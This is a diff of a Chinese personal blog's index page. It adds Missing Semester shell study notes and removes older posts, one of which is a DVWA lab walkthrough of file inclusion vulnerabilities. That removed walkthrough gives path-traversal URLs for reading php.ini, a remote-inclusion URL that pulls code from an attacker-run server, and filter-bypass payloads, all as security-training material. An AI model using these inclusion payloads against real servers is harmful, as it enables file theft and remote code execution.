@@ -160,6 +160,345 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/29/missing-semester/Command-line%20Environment/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/29/missing-semester/Command-line%20Environment/" class="post-title-link" itemprop="url">Command-line Environment</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-29 13:28:27" itemprop="dateCreated datePublished" datetime="2022-03-29T13:28:27+08:00">2022-03-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-30 21:41:34" itemprop="dateModified" datetime="2022-03-30T21:41:34+08:00">2022-03-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Missing-Semester/" itemprop="url" rel="index"><span itemprop="name">Missing-Semester</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Command-line-Environment"><a href="#Command-line-Environment" class="headerlink" title="Command-line Environment"></a>Command-line Environment</h1><h2 id="SIGNAL"><a href="#SIGNAL" class="headerlink" title="SIGNAL"></a>SIGNAL</h2><p>您的 <code>shell</code> 会使用 <code>UNIX</code> 提供的信号机制执行进程间通信。</p>
+<p>我们可以使用<code>man signal</code> 来查看<code>signal</code>的帮助文档。</p>
+<p>对于如下的 <code>python</code> 程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> signal, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">signum, time</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nI got a SIGINT, but I am not stopping&quot;</span>)</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT, handler)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    time.sleep(<span class="number">.1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\r&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>运行该程序后按 <code>ctrl+c</code> 会捕捉到信号程序继续运行。</p>
+<p>视频中按 <code>ctrl+\</code> 可以结束程序，但是我这里不知道为什么不行，得按 <code>ctrl+z</code>。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/29/missing-semester/Command-line%20Environment/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/28/missing-semester/Data%20Wrangling/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/28/missing-semester/Data%20Wrangling/" class="post-title-link" itemprop="url">Data Wrangling</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-28 11:08:27" itemprop="dateCreated datePublished" datetime="2022-03-28T11:08:27+08:00">2022-03-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-30 21:41:52" itemprop="dateModified" datetime="2022-03-30T21:41:52+08:00">2022-03-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Missing-Semester/" itemprop="url" rel="index"><span itemprop="name">Missing-Semester</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Data-Wrangling"><a href="#Data-Wrangling" class="headerlink" title="Data Wrangling"></a>Data Wrangling</h1><p>以下代码可以查看服务器的日志<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh myserver journalctl</span><br></pre></td></tr></table></figure></p>
+<p>需要注意的是 <code>myserver</code> 由，&lt;用户名&gt;@&lt;$ip$地址构成&gt;</p>
+<p><code>sed</code> 是一种匹配工具，<code>s</code> 命令的形式如下：<code>s/REGEX/SUBSTITUTION/</code>  其中 <code>REGEX</code> 是正则表达式，而<code>SUBSTITUTION</code> 是替代文本，也就是将匹配到的正则表达式转换为代替文本，默认只替代一遍。在后面加上<code>g</code> 可以多次匹配。</p>
+<p>为了支持更不用加上<code>\</code> 我们需要在<code>sed</code>后加上<code>-E</code></p>
+<p>以下是该命令的一些示例用法：<br></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/28/missing-semester/Data%20Wrangling/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/27/missing-semester/Shell%20Tools%20and%20Scripting%E8%AF%BE%E5%90%8E%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/27/missing-semester/Shell%20Tools%20and%20Scripting%E8%AF%BE%E5%90%8E%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">Shell Tools and Scripting课后练习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-03-27 16:46:27 / Modified: 20:09:26" itemprop="dateCreated datePublished" datetime="2022-03-27T16:46:27+08:00">2022-03-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Missing-Semester/" itemprop="url" rel="index"><span itemprop="name">Missing-Semester</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Shell-Tools-and-Scripting课后练习"><a href="#Shell-Tools-and-Scripting课后练习" class="headerlink" title="Shell Tools and Scripting课后练习"></a>Shell Tools and Scripting课后练习</h1><ol>
+<li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~/missing$ ls -lhat --color</span><br><span class="line">total 0</span><br><span class="line">-rw-r--r-- 1 rust rust    7 Mar 27 16:18 foo1</span><br><span class="line">drwxr-xr-x 1 rust rust 4.0K Mar 26 22:01 ..</span><br><span class="line">drwxr-xr-x 1 rust rust 4.0K Mar 26 18:55 .</span><br><span class="line">-rwxrwxrwx 1 rust rust   83 Mar 26 18:55 script.py</span><br><span class="line">drwxr-xr-x 1 rust rust 4.0K Mar 26 18:19 bar</span><br><span class="line">drwxr-xr-x 1 rust rust 4.0K Mar 26 18:19 foo</span><br><span class="line">-rw-r--r-- 1 rust rust    0 Mar 26 18:11 foo10</span><br><span class="line">-rw-r--r-- 1 rust rust    0 Mar 26 18:11 foo2</span><br><span class="line">drwxr-xr-x 1 rust rust 4.0K Mar 26 17:14 b</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">marco.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">marco() &#123;</span><br><span class="line">    export MARCO=$(pwd)</span><br><span class="line">&#125;</span><br><span class="line">polo() &#123;</span><br><span class="line">    cd &quot;$MARCO&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~/missing/test$ source marco.sh</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~/missing/test$ cd ..</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~/missing$ marco</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~/missing$ cd</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~$ polo</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~/missing$</span><br></pre></td></tr></table></figure>
+<ol>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">count=1</span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line">     ./buggy.sh 2&gt; out.log</span><br><span class="line">     <span class="keyword">if</span> [[ $? -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">         <span class="built_in">echo</span> <span class="string">&quot;failed after <span class="variable">$count</span> times&quot;</span></span><br><span class="line">         cat out.log</span><br><span class="line">         <span class="built_in">break</span></span><br><span class="line">     <span class="keyword">fi</span></span><br><span class="line">     ((count++))</span><br><span class="line"></span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/26/missing-semester/Shell%20Tools%20and%20Scripting/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/26/missing-semester/Shell%20Tools%20and%20Scripting/" class="post-title-link" itemprop="url">Shell Tools and Scripting</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-26 14:01:27" itemprop="dateCreated datePublished" datetime="2022-03-26T14:01:27+08:00">2022-03-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-30 21:43:15" itemprop="dateModified" datetime="2022-03-30T21:43:15+08:00">2022-03-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Missing-Semester/" itemprop="url" rel="index"><span itemprop="name">Missing-Semester</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Shell-Tools-and-Scripting"><a href="#Shell-Tools-and-Scripting" class="headerlink" title="Shell Tools and Scripting"></a>Shell Tools and Scripting</h1><p>shell可以定义变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~$ foo=bar</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~$ <span class="built_in">echo</span> <span class="variable">$foo</span></span><br><span class="line">bar</span><br></pre></td></tr></table></figure>
+<p>用空格分开会被认为是可执行程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~$ foo = bar</span><br><span class="line">Command &#x27;foo&#x27; not found, did you mean:</span><br></pre></td></tr></table></figure>
+<p>在打印字符串的时候，单引号和双引号相同</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~$ echo &quot;Hello&quot;</span><br><span class="line">Hello</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~$ echo &#x27;World&#x27;</span><br><span class="line">World</span><br></pre></td></tr></table></figure>
+<p>但是在打印变量的时候，单引号不会替换变量</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~$ echo &quot;Value is $foo&quot;</span><br><span class="line">Value is bar</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~$ echo &#x27;Value is $foo&#x27;</span><br><span class="line">Value is $foo</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/26/missing-semester/Shell%20Tools%20and%20Scripting/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/25/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(8)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -680,522 +1019,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-17 15:57:27" itemprop="dateCreated datePublished" datetime="2022-03-17T15:57:27+08:00">2022-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-19 10:44:27" itemprop="dateModified" datetime="2022-03-19T10:44:27+08:00">2022-03-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数<strong>（include()，require()和include_once()，require_once()）</strong>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
-<h2 id="低等级"><a href="#低等级" class="headerlink" title="低等级"></a>低等级</h2><ol>
-<li>在网页上，服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</li>
-</ol>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317213618855.png" alt></p>
-<p>可以看到依次点击可以返回<code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code> 的内容</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215051380.png" alt></p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215106647.png" alt></p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215122724.png" alt></p>
-<p>随便输入一个文件名</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215230874.png" alt></p>
-<p>报错，页面显示错误信息，没有这个文件（因为不是系统），但是暴露了服务器文件的绝对路径，于是根据经验找到了一些有趣的东西</p>
-<p>构造绝对路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=E:\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
-<p>构造相对路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
-<p>可以得到文件的内容：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215412124.png" alt></p>
-<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>在服务器的php配置中，当选项allow_url_fopen与allow_url_include为开启状态 时，服务器会允许包含远程远程服务器上的文件，如果对文件来源没有检查， 就会导致 任意远程代码执行，还记得前面的这句话：服务器包含文件时，不管文件后缀是否是 php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
-<p>我们新建一个txt文件，输入以下内容：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220328003.png" alt></p>
-<p>我们用python创建一个文件服务器</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220304856.png" alt></p>
-<p>可以看到我们成功创建了一个文件服务器并上传了一个文件：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220358559.png" alt></p>
-<p>我们通过输入url</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.*.*/dvwa/vulnerabilities/fi/?page=http://10.19.*.*:8000/poc.txt</span><br></pre></td></tr></table></figure>
-<p>可以成功的得到php的信息</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220913282.png" alt></p>
-<h3 id="中等级"><a href="#中等级" class="headerlink" title="中等级"></a>中等级</h3><p>1.查看代码可知，Medium级别的代码增加了str_replace函数，对page参数进行了一定的 处理，将”http:// ”、”<a target="_blank" rel="noopener" href="https://”、">https://”、</a> ” ../”、”..\”替换为空字符，即删除，对于相对路径包含 以及远程文件包含有一定的防御作用。</p>
-<p>2.文件包含的限制绕过<br>使用str_replace函数是极其不安全的，因为可以使用双写绕过规则，比如像下面这样~~page=ht<a target="_blank" rel="noopener" href="http://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。">http://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。</a></p>
-<p>通过大小写也可以绕过。</p>
-<p>相对路径可以通过以下方式绕过。</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317221636399.png" alt></p>
-<h2 id="高等级"><a href="#高等级" class="headerlink" title="高等级"></a>高等级</h2><p>1.可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。 </p>
-<p>2.漏洞利用<br>    High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以 利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个 本地文件时，用的就是file协议。</p>
-<p>我们在前面加上file:///就可以打开文件</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://wuyuesong.github.io/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/" class="post-title-link" itemprop="url">信息安全概论（2）</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-16 17:32:27" itemprop="dateCreated datePublished" datetime="2022-03-16T17:32:27+08:00">2022-03-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-19 10:45:40" itemprop="dateModified" datetime="2022-03-19T10:45:40+08:00">2022-03-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="信息安全概论（2）"><a href="#信息安全概论（2）" class="headerlink" title="信息安全概论（2）"></a>信息安全概论（2）</h1><h2 id="2-1-密码学基本概念——加密和解密"><a href="#2-1-密码学基本概念——加密和解密" class="headerlink" title="2.1 密码学基本概念——加密和解密"></a>2.1 密码学基本概念——加密和解密</h2><h3 id="机密与真实性的解决方法——加密"><a href="#机密与真实性的解决方法——加密" class="headerlink" title="机密与真实性的解决方法——加密"></a>机密与真实性的解决方法——加密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">  明文--加密算法 加密密钥--&gt;密文</span><br><span class="line">  密文--解密算法 解密密钥--&gt;明文</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="两种密码体制"><a href="#两种密码体制" class="headerlink" title="两种密码体制"></a>两种密码体制</h3><h4 id="单钥密码体制"><a href="#单钥密码体制" class="headerlink" title="单钥密码体制"></a>单钥密码体制</h4><p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/信息安全概论(2" alt>\image-20220316164218625.png)</p>
-<blockquote>
-<p>加密密钥和解密密钥相同，或能相互推导</p>
-</blockquote>
-<p>单钥算法不能提供抗抵赖保护。</p>
-<ol>
-<li>数据世界中，复制件和原件是不可区分的。</li>
-<li>通信双方对密文Y有对等的生产能力。</li>
-</ol>
-<p>所以单钥密码算法也被称为对称密码算法。</p>
-<p>单钥密码加密的应用条件：</p>
